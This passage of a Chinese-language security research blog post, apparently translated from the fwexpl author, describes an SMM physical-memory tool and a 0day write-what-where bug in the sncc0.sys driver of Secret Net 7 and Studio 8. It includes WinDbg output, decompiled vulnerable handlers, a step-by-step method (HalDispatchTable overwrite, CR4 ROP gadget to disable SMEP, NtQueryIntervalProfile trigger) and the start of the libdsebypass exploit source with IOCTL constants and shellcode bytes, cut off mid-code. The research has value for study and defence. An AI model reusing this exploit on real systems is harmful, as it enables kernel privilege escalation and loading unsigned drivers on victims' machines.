<p>该脚本允许选择特定的目标来进行攻击。如上所示，你可以找到目标<code>EFI_BOOT_SERVICES</code>的地址，并将新条目添加到<code>g_targets[]</code>数组中。</p>
<p>我编写了一个能够在命令行运行的程序<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/tree/master/src/application">fwexpl_app</a>，它允许执行一些基本的SMM payload，如物理内存读写。下面是它的命令行参数选项：</p>
<ul>
<li><code>--target &lt;N&gt;</code> —— 选择特定目标，其中<N>是<code>g_targets[]</code>的数组索引</li>
<li><code>--target-list</code> —— 输出可用的目标信息</li>
<li><code>--phys-mem-read &lt;addr&gt;</code> —— 从指定地址开始读取物理内存</li>
<li><code>--whys-mem-write &lt;addr&gt;</code> —— 从指定地址开始写入物理内存</li>
<li><code>--length &lt;bytes&gt;</code> —— 为<code>--phys-mem-read</code>或<code>--whys-mem-write</code>读取&#x2F;写入的字节数</li>
<li><code>--file &lt;path&gt;</code> —— 读取或写入的内存dump路径，在<code>--phys-mem-read</code>的情况下，此参数是可选的，如未指定，程序会将读取的物理内存的十六进制值输出到stdout。</li>
<li><code>--exec &lt;addr&gt;</code> —— 在指定的物理内存地址执行SMM代码</li>
</ul>
<p>使用fwexpl_app在ThinkPad T450s上转储SMRAM的TSEG区域：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163032691.png" alt="image-20230809163032691"></p>
<p>该程序需要加载自己的未签名内核驱动程序，因此必须在禁用DSE后重启Windows。</p>
<h1 id="DSE绕过和提权0day"><a href="#DSE绕过和提权0day" class="headerlink" title="DSE绕过和提权0day"></a>DSE绕过和提权0day</h1><p>在实际应用的角度来看，绕过DSE并加载未签名驱动的技术是很有用的。要做到这一点，且不需要在操作系统本身上使用大量0day的方法 —— 从其他拥有有效数字签名的第三方产品中安装有漏洞的内核驱动程序，并利用其漏洞允许自己的ring0代码。在网上有几种工具使用此方法来绕过DSE ——  <a target="_blank" rel="noopener" href="https://github.com/hfiref0x/DSEFix">DSEFix</a> by <a target="_blank" rel="noopener" href="https://twitter.com/hfiref0x">EP_X0FF</a>，它在VirtualBox中安装并利用了内核驱动程序。</p>
<p>我决定在某个内核驱动程序中找到自己的0day漏洞，并使用它来实现对libfwexpl的DSE绕过支持。我的目标为俄罗斯公司<a target="_blank" rel="noopener" href="http://www.securitycode.ru/">Код Безопасности</a> (Security Code)的 <a target="_blank" rel="noopener" href="http://www.securitycode.ru/products/secret_net/">Secret Net 7</a> 和 <a target="_blank" rel="noopener" href="http://www.securitycode.ru/products/secret-net-studio/">Secret Net Studio 8</a>（beta版）。实际上这些产品的安全性并不好，但我发现它们在本地提取和DSE绕过方面非常有用。</p>
<p>从Security Code的Secret Net 7.4.577.0开始：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163042807.png" alt="image-20230809163042807"></p>
<p>该产品安装了大量的内核驱动程序：Sn5CrPack.sys, SnFDC.sys, Sn5Crypto.sys, SnNetFlt.sys, SnCDFilter.sys, SnTmCardDrv.sys, SnDDD.sys, snCloneVault.sys, SnDeviceFilter.sys, sncc0.sys, SnDiskFilter.sys, sndacs.sys, SnEraser.sys, snmc5xx.sys, SnExeQuota.sys, snsdp.sys.</p>
<p>花了一些时间在内核调试器中监视这些驱动程序的IOCTL请求后，我决定检查一下<code>sncc0.sys</code>的IRP handlers代码，该代码加载为<code>\Driver\sncc0</code>并使用设备对象<code>\Device\SNC0_Sys</code>与用户模式进行通信。让我们来借助WinDbg来确定该驱动的<code>IRP_MJ_DEVICE_CONTROL</code> handler地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !drvobj \Driver\sncc0</span><br><span class="line">Driver object (ffffe001f616d240) is for:</span><br><span class="line">\Driver\sncc0</span><br><span class="line">Driver Extension List: (id , addr)</span><br><span class="line"> </span><br><span class="line">Device Object list:</span><br><span class="line">ffffe001f6979510</span><br><span class="line">0: kd&gt; !devobj ffffe001f6979510</span><br><span class="line">Device object (ffffe001f6979510) is for:</span><br><span class="line">SNCC0_Sys \Driver\sncc0 DriverObject ffffe001f616d240</span><br><span class="line">Current Irp 00000000 RefCount 0 Type 00000022 Flags 00000044</span><br><span class="line">Dacl ffffc101421fde21 DevExt 00000000 DevObjExt ffffe001f6979660</span><br><span class="line">ExtensionFlags (0x00000800)  DOE_DEFAULT_SD_PRESENT</span><br><span class="line">Characteristics (0000000000)</span><br><span class="line">Device queue is not busy.</span><br><span class="line">0: kd&gt; dt _DRIVER_OBJECT ffffe001f616d240</span><br><span class="line">nt!_DRIVER_OBJECT</span><br><span class="line">   +0x000 Type             : 0n4</span><br><span class="line">   +0x002 Size             : 0n336</span><br><span class="line">   +0x008 DeviceObject     : 0xffffe001`f6979510 _DEVICE_OBJECT</span><br><span class="line">   +0x010 Flags            : 0x12</span><br><span class="line">   +0x018 DriverStart      : 0xfffff801`e438c000 Void</span><br><span class="line">   +0x020 DriverSize       : 0x20000</span><br><span class="line">   +0x028 DriverSection    : 0xffffe001`f625da70 Void</span><br><span class="line">   +0x030 DriverExtension  : 0xffffe001`f616d390 _DRIVER_EXTENSION</span><br><span class="line">   +0x038 DriverName       : _UNICODE_STRING &quot;\Driver\sncc0&quot;</span><br><span class="line">   +0x048 HardwareDatabase : 0xfffff803`c913f598 _UNICODE_STRING &quot;\REGISTRY\MACHINE\HARDWARE\DESCRIPTION\SYSTEM&quot;</span><br><span class="line">   +0x050 FastIoDispatch   : (null)</span><br><span class="line">   +0x058 DriverInit       : 0xfffff801`e43a9000     long  sncc0!DllUnload+0</span><br><span class="line">   +0x060 DriverStartIo    : (null)</span><br><span class="line">   +0x068 DriverUnload     : 0xfffff801`e43916f0     void  +0</span><br><span class="line">   +0x070 MajorFunction    : [28] 0xfffff801`e4391150     long  +0</span><br><span class="line">0: kd&gt; dps ffffe001f616d240+0x70 L1c</span><br><span class="line">ffffe001`f616d2b0  fffff801`e4391150 sncc0+0x5150 # IRP_MJ_CREATE handler</span><br><span class="line">ffffe001`f616d2b8  fffff803`c8b7bcf4 nt!IopInvalidDeviceRequest</span><br><span class="line">ffffe001`f616d2c0  fffff801`e43910a0 sncc0+0x50a0 # IRP_MJ_CLOSE handler</span><br><span class="line">...</span><br><span class="line">ffffe001`f616d320  fffff801`e4391210 sncc0+0x5210 # IRP_MJ_DEVICE_CONTROL handler</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>然后用IDA加载该驱动文件，并分析<code>sncc0 + 0x5210</code>函数的作用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_180005210</span><span class="params">(__int64 DeviceObject, <span class="keyword">struct</span> _IRP *Irp)</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// rdx@5</span></span><br><span class="line">    __int64 v3; <span class="comment">// r8@5</span></span><br><span class="line">    __int64 v4; <span class="comment">// r9@5</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Status; <span class="comment">// [sp+20h] [bp-38h]@1</span></span><br><span class="line">    <span class="type">int</span> v7; <span class="comment">// [sp+24h] [bp-34h]@1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> OutSize; <span class="comment">// [sp+28h] [bp-30h]@1</span></span><br><span class="line">    ULONG InSize; <span class="comment">// [sp+2Ch] [bp-2Ch]@1</span></span><br><span class="line">    ULONG v10; <span class="comment">// [sp+30h] [bp-28h]@1</span></span><br><span class="line">    ULONG Code; <span class="comment">// [sp+34h] [bp-24h]@1</span></span><br><span class="line">    <span class="type">void</span> *Buffer; <span class="comment">// [sp+38h] [bp-20h]@1</span></span><br><span class="line">    IO_STACK_LOCATION *Stack; <span class="comment">// [sp+40h] [bp-18h]@1</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span> *<span class="title">Irp_</span>;</span> <span class="comment">// [sp+68h] [bp+10h]@1</span></span><br><span class="line"> </span><br><span class="line">    Irp_ = Irp;</span><br><span class="line">    Irp-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">    Status = <span class="number">0xC0000002</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get IOCTL request information (control code, user buffer, etc.)</span></span><br><span class="line">    Stack = sub_180005780(Irp);</span><br><span class="line">    Buffer = Irp_-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    InSize = Stack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">    OutSize = Stack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">    Code = Stack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// process different kinds of IOCTL requests</span></span><br><span class="line">    <span class="keyword">switch</span> (Code)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x220010</span>u:</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (InSize &gt;= <span class="number">0x60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Call of some function that accepts user buffer with</span></span><br><span class="line">            <span class="comment">// &gt;= 60 bytes of length as input.</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            Status = sub_180009D50(Buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            Status = <span class="number">0xC00000E8</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (Status)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (Status == <span class="number">0x80000005</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// return OutSize bytes of data back to the caller</span></span><br><span class="line">            Irp_-&gt;IoStatus.Information = OutSize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Irp_-&gt;IoStatus.Information = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// complete IOCTL request</span></span><br><span class="line">    Irp_-&gt;IoStatus.Status = Status;</span><br><span class="line">    IofCompleteRequest(Irp_, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>   经过逆向分析后，我发现<code>0x20010</code>（使用 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff554436(v=vs.85).aspx">buffered I&#x2F;O method</a> 来处理传递给<code> NtDeviceIoControlFile()</code>系统调用的用户模式缓冲区）的IOCTL执行了有漏洞的函数<code>sub_180009D50()</code>，攻击者可以向该函数传入可控的IOCTL输入缓冲区指针（位于non-paged内核池中）作为参数。<code>sub_180009D50()</code>使用输入缓冲区作为结构体，其字段指向第二个结构体。第二个结构体被传递给<code>sub_180004A70()</code>，但没有任何内核内存覆盖的边界检查和验证（write-what-where条件）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_180009D50</span><span class="params">(<span class="type">void</span> *Buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 从IOCTL输入缓冲区开头读取一些data缓冲区地址</span></span><br><span class="line">    <span class="comment">// 并将其传递给其他函数（复制攻击者控制的数据到该地址）</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> sub_180004A70(</span><br><span class="line">        *(<span class="type">void</span> **)Buffer, <span class="comment">// &lt;= !!!</span></span><br><span class="line">        *((_DWORD *)Buffer + <span class="number">0x16</span>),</span><br><span class="line">        *((_DWORD *)Buffer + <span class="number">0x17</span>),</span><br><span class="line">        (<span class="type">char</span> *)Buffer + <span class="number">0x60</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">__int64 __fastcall <span class="title function_">sub_180004A70</span><span class="params">(<span class="type">void</span> *a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3, <span class="type">void</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 该函数所有输入参数都被攻击者通过制定的IOCTL请求进行控制</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    __int64 Status; <span class="comment">// rax@2</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (a1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*((_DWORD *)a1 + <span class="number">6</span>) == <span class="number">0xC00000B5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Status = <span class="number">0xC0000120</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// Vulnerability is here:</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// 经典的&quot;write-what-where&quot;条件，该条件允许攻击者使用被控制的数据覆盖任意内核内存</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            *((_DWORD *)a1 + <span class="number">6</span>) = a2;</span><br><span class="line">            **((_DWORD **)a1 + <span class="number">2</span>) = a3;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (!a2 &amp;&amp; a3 &lt;= *(_DWORD *)a1)</span><br><span class="line">            &#123;</span><br><span class="line">                qmemcpy(*((<span class="type">void</span> **)a1 + <span class="number">1</span>), a4, a3);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            KeSetEvent((PRKEVENT)((<span class="type">char</span> *)a1 + <span class="number">32</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            Status = <span class="number">0</span>i64;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Status = <span class="number">0xC000000D</span>i64;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一个产品Secret Net Studio 8也有此漏洞，因为它们共享同一个的驱动程序。</p>
<p>即使在最新的Windows版本上，write-what-where内核漏洞的利用步骤还是很细的，下面是实现该漏洞利用的一种流行方式：</p>
<ol>
<li>作为覆盖目标，攻击者使用<code>HAL_DISPATCH_TABLE </code>内核结构体构成的<code>HalQuerySystemInformation </code>字段（指向HAL函数），该字段可作为导出内核符号<code>nt!HalDispatchTable</code>进行访问。</li>
<li>作为覆盖<code>HalQuerySystemInformation</code> 字段的值，攻击者使用位于某些内核模块的可执行节内的ROP gadget <code>MOV CR4</code>，<code>EAX/RET</code>的地址。这个ROP gadget对禁用<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Control_register#CR4">CR4寄存器</a>的SMEP flag(它<a target="_blank" rel="noopener" href="http://j00ru.vexillium.org/?p=783">禁止使用</a>内核权限执行用户模式内存) 将执行转移到执行提权，加载未签名的内核驱动或执行其他ring0代码的用户模式shellcode而言是必需的。</li>
<li>攻击者调用<code>NtQueryIntervalProfile()</code>系统调用来触发执行被覆盖的HAL函数指针。</li>
<li>执行完shellcode后，攻击者需要将CR4寄存器恢复成原始值——因为一旦它被修改，PatchGuard就会导致系统崩溃。</li>
</ol>
<p>我将整个DSE绕过的代码整理为一个独立库<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/tree/master/src/libdsebypass">libdsebypass</a>，该库位于libfwexpl源代码树中。下面是其主要利用代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 向驱动发送IOCTL请求的常量</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPL_BUFF_SIZE      0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPL_CONTROL_CODE   0x220010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPL_DEVICE_PATH    <span class="string">&quot;\\\\.\\Global\\SNCC0_Sys&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// exploit global variables</span></span><br><span class="line"><span class="type">static</span> PHAL_DISPATCH m_HalDispatchTable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> func_ExAllocatePool f_ExAllocatePool = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> PVOID m_Rop_Mov_Cr4 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> BOOL m_bExplOk = FALSE;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// external ring0 payload information</span></span><br><span class="line"><span class="type">static</span> KERNEL_EXPL_HANDLER m_Handler = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> PVOID m_HandlerContext = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">void</span> WINAPI _r0_proc_continue(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_HalDispatchTable &amp;&amp; f_ExAllocatePool)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_AMD64_)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TEMP_CODE_LEN 6</span></span><br><span class="line"> </span><br><span class="line">        <span class="type">char</span> TempCode[] =</span><br><span class="line">            <span class="string">&quot;\xB8\x01\x00\x00\xC0&quot;</span>  <span class="comment">// mov      eax, 0xC00000001</span></span><br><span class="line">            <span class="string">&quot;\xC3&quot;</span>;                 <span class="comment">// retn</span></span><br><span class="line"><span class="meta">#<span 